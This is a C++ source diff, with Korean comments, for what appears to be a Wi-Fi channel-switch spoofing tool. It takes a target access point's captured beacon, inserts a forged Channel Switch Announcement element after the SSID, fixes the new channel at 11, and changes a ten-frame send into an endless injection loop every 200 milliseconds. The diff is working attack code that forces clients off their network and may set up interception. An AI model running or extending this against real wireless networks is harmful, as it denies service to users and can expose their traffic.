@@ -45,9 +45,14 @@ int main(int argc, char* argv[]) {
     //=========Find target AP's beacon frame=========
     
     const u_char* packet;
-    int packet_len; //라디오탭 제거된 패킷 길이
-    packet = find_target_beacon(pcap, &config, &packet_len);
+    int total_packet_len, packet_len;
+    ieee80211_radiotap_header* radiotap_header = nullptr;
+    packet = find_target_beacon(pcap, &config, &total_packet_len, &radiotap_header);
+    packet_len = total_packet_len - radiotap_header->it_len ;
     ieee80211_mac_header* mac_header = (ieee80211_mac_header*)packet;
+    
+    std::cout << "Total Packet Length (with Radiotap): " << total_packet_len << std::endl;
+    std::cout << "802.11 Packet Length (without Radiotap): " << packet_len << std::endl;
 
     dump(packet, packet_len);
     std::cout << "========================" << std::endl;
@@ -56,42 +61,77 @@ int main(int argc, char* argv[]) {
 
     std::cout << "Current Channel: " << config.ap_current_channel << std::endl;
     int switchChannel = setSwitchChannel(config.ap_current_channel);
-    channel_switch_announcement_ie csa_ie = create_channel_switch_announcement_ie(switchChannel, 3);
+    channel_switch_announcement_ie csa_ie = create_channel_switch_announcement_ie(11, 3); // 11번 채널 고정
 
     //=========Parse beacon frame body=========
     beacon_frame_body* frame_body = (beacon_frame_body*)(packet + sizeof(ieee80211_mac_header));
-    // dump((const u_char*)frame_body, sizeof(*frame_body));
 
     //TODO : Beacon 타임스탬프 설정
 
+    //TODO : Beacon Interval 설정
 
-    //=======패킷 조합========
-    // TODO : radiotap header + mac header + beacon frame body + csa_ie 조합해서 새로운 패킷 생성
-    int copy_len = packet_len; // FCS 제거
-    int new_packet_len = copy_len + sizeof(csa_ie);
+    //Beacon Frame Body에서 IE 순회하면서 CSA IE 삽입할 위치 확인
+    const uint8_t* ptr = packet + sizeof(ieee80211_mac_header) + sizeof(beacon_frame_body);
+    const uint8_t* end = packet + packet_len;
+    const uint8_t* insert_pos = nullptr;
+
+    while (ptr + 2 <= end) 
+    {
+        uint8_t tag = ptr[0];
+        uint8_t len = ptr[1];
+
+        if (ptr + 2 + len > end) break; 
+
+        if (tag == ieee80211_IE::SSID) 
+        { // SSIDs보다 뒤에 삽입해야하므로 SSID IE 발견 시점에서 삽입 위치 설정
+            insert_pos = ptr + 2 + len; // "뒤"에 삽입
+            break;
+        }
+        ptr += 2 + len;
+    }
+
+    //============================= 패킷 생성 =============================
+
+    // FCS 제거된 802.11 길이
+    int body_len = packet_len - 4;
+
+    // 전체 길이 = radiotap + mac_frame_header + CSA  + body
+    int new_packet_len = radiotap_header->it_len + body_len + sizeof(csa_ie);
     u_char* new_packet = new u_char[new_packet_len];
 
+    //라디오 헤더 복사
+    memcpy(new_packet, radiotap_header, radiotap_header->it_len);
 
-    //기존 FCS 제거된 패킷 복사
-    memcpy(new_packet, packet, copy_len);
-    //CSA IE 삽입
-    memcpy(new_packet + copy_len, &csa_ie, sizeof(csa_ie));
+    // 맥 프레임 기준 시작 위치
+    u_char* dst = new_packet + radiotap_header->it_len;
 
+    // CSA 삽입 위치까지 앞부분 복사
+    size_t front_len = insert_pos - packet;
+    memcpy(dst, packet, front_len);
 
+    // CSA 삽입
+    memcpy(dst + front_len, &csa_ie, sizeof(csa_ie));
+
+    // CSA 이후 복사
+    size_t back_len = body_len - front_len;
+    memcpy(dst + front_len + sizeof(csa_ie), insert_pos, back_len);
     dump(new_packet, new_packet_len);
 
+    //=====================================================================
 
     //============CSA 프레임 송신 ===========
-    for(int i=0;i<10;i++)
+    int cnt = 1;
+    while (true)
     {
         int res = pcap_sendpacket(pcap, new_packet, new_packet_len);
         if (res != 0) {
             std::cerr << "pcap_sendpacket error: " << pcap_geterr(pcap) << std::endl;
         }
         else{
-            std::cout << "Sent CSA frame to AP " << (std::string)config.ap_mac << " to switch to channel " << (int)csa_ie.new_channel_number << std::endl;
+            std::cout << "Sent CSA frame to AP " << cnt << ": " << (std::string)config.ap_mac << " to switch to channel " << (int)csa_ie.new_channel_number << std::endl;
         }
-        
+        cnt++;
+        usleep(200000); //1초마다 전송
     }
 
     delete[] new_packet;
